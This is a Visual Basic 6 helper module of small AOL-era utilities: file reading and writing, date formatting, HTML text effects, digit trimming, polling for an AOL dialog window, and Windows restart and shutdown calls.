Public Function FileInput(FileName As String)
Dim Free
Free = FreeFile
Dim i As Long, X As String
Open FileName For Input As Free
    i = FileLen(FileName)
    X = Input(i, Free)
Close Free
    FileInput = X
End Function
Public Function FileInput2(FileName As String)
'this is for if the the first FileInput
'adds two characters at the end
'those two are not neccasarry and sometimes show up
'use this method if you encounter that problem
Dim Free
Free = FreeFile
Dim i As Long, X As String
Open FileName For Input As Free
    i = FileLen(FileName)
    X = Input(i - 2, Free)
Close Free
    FileInput2 = X
End Function
Public Sub FileWrite(FileName As String, Wat As String)
Dim Ffile
Ffile = FreeFile

Open FileName For Output As #Ffile
    Print #Ffile, Wat
Close #Ffile

End Sub

Public Function LoadTimes(ProgName As String)
'New an improved
    On Error Resume Next
    Dim Num
Num = GetSetting(ProgName, "Load", "Times")
    Num = Val(Num) + 1

Call SaveSetting(ProgName, "Load", "Times", Num)
LoadTimes = Num
End Function
Public Sub LoadTimesReset(ProgName As String)
'Changes the times to 0
    On Error Resume Next

Call SaveSetting(ProgName, "Load", "Times", "0")
End Sub







Public Function RandomNum(last)
'creates a random number from 1 to last
Dim X As Integer
X = Int(Rnd * last + 1)
        RandomNum = X

End Function

Public Function ReplaceChar(Where, LookFor As String, Replace As String)
'this is to replace one character
'ex. text1.text = ReplaceChar(text1.text,"a","b")
'that will change all a's to b's
Dim X As Integer, i As String, strin As String
For X = 1 To Len(Where)
i$ = Mid(Where, X, 1)
If i$ = LookFor Then Let i$ = Replace
strin$ = strin$ & i$
Next X
ReplaceChar = strin$
End Function

Public Function TDate()
Dim X
X = Format(Date, "mmmm/dd/yyyy")
TDate = X
End Function
Public Function TDate2()
Dim X
X = Format(Date, "mm/dd/yy")
TDate2 = X
End Function
Public Function TDate3()
Dim X
X = Format(Date, "mm/dd/yyyy")
TDate3 = X
End Function

Public Function Text_BoldCrazy(strin As String)
Dim X As Integer, i As String, i2 As String, final As String
For X = 1 To Len(strin) Step 2
i$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
final$ = final$ & "<B>" & i$ & "</B>" & i2$
Next X
Text_BoldCrazy = final$

End Function



Public Function Text_Reverse(Wat As String)
Dim X As Integer, rev As String, i As String
For X = Len(Wat) To 1 Step -1
i = Mid(Wat, X, 1)
rev$ = rev$ & i
Next X
Text_Reverse = rev$
End Function





Public Function Time()
' where can = a label textbox etc
'wherever you want the time to be
'use this in a timer
Dim X
X = Format(Now, "h:mm:ss am/pm")
Time = X
End Function

Public Function TrimNumbers(strin As String)
'This can be useful for screen names
'i made an aol program that mass im'ed people
'and i made this so that instead of saying
'"whats up Mike12345" it said "whats up Mike"
'cool huh?
Dim i As Integer, l As String, Trimmed As String
For i = 1 To Len(strin)
l$ = Mid(strin, i, 1)
If l$ = "1" Then Let l$ = "": GoTo Done
If l$ = "2" Then Let l$ = "": GoTo Done
If l$ = "3" Then Let l$ = "": GoTo Done
If l$ = "4" Then Let l$ = "": GoTo Done
If l$ = "5" Then Let l$ = "": GoTo Done
If l$ = "6" Then Let l$ = "": GoTo Done
If l$ = "7" Then Let l$ = "": GoTo Done
If l$ = "8" Then Let l$ = "": GoTo Done
If l$ = "9" Then Let l$ = "": GoTo Done
If l$ = "0" Then Let l$ = "": GoTo Done

Done:
Trimmed$ = Trimmed$ & l$
Next i
TrimNumbers = Trimmed$
End Function



Public Function Text_Wavy(Wat As String)
Dim X As Integer, i As String, i2 As String, i3 As String, i4 As String
 Dim strin As String
    For X = 1 To Len(Wat) Step 4
 i$ = Mid(Wat, X, 1)
 i2$ = Mid(Wat, X + 1, 1)
 i3$ = Mid(Wat, X + 2, 1)
 i4$ = Mid(Wat, X + 3, 1)
 strin$ = strin$ & "<sup>" & i$ & "</sup>" & i2$ & "<sub>" & i3$ & "</sub>" & i4$
 
    Next X
        Text_Wavy = strin$
End Function
Public Function Text_BoldWavy(Wat As String)
Dim X As Integer, i As String, i2 As String, i3 As String, i4 As String
 Dim strin As String

For X = 1 To Len(Wat) Step 4
 i$ = Mid(Wat, X, 1)
 i2$ = Mid(Wat, X + 1, 1)
 i3$ = Mid(Wat, X + 2, 1)
 i4$ = Mid(Wat, X + 3, 1)
 strin$ = strin$ & "<b><sup>" & i$ & "</sup>" & i2$ & "<sub>" & i3$ & "</sub>" & i4$ & "</b>"
 
Next X
Text_BoldWavy = strin$
End Function
Public Function Text_ItalicBoldWavy(Wat As String)
Dim X As Integer, i As String, i2 As String, i3 As String, i4 As String
 Dim strin As String

For X = 1 To Len(Wat) Step 4
 i$ = Mid(Wat, X, 1)
 i2$ = Mid(Wat, X + 1, 1)
 i3$ = Mid(Wat, X + 2, 1)
 i4$ = Mid(Wat, X + 3, 1)
 strin$ = strin$ & "<i><b><sup>" & i$ & "</sup>" & i2$ & "<sub>" & i3$ & "</sub>" & i4$ & "</b></i>"
 
Next X
Text_ItalicBoldWavy = strin$
End Function

Public Sub Wait(HLong)
Dim Current
Current = Timer
Do While Timer - Current < Val(HLong)
DoEvents
Loop
End Sub


Public Sub WaitForModal()
'this is for function in the bas file
Dim Modal As Long, Stat As Long, Edi As Long
Do: DoEvents
Modal& = FindWindow("_AOL_Modal", vbNullString)
Stat& = FindWindowEx(Modal&, 0&, "_AOL_Static", vbNullString)
Edi& = FindWindowEx(Modal&, 0&, "_AOL_Edit", vbNullString)
If Modal& <> 0 And Stat& <> 0 And Edi& <> 0 Then Exit Do
Loop

End Sub


Public Sub Windows_ReStart()
Call ExitWindows(EWX_REBOOT, 0)

End Sub

Public Sub Windows_ShutDown()
Call ExitWindows(EWX_SHUTDOWN, 0)
End Sub


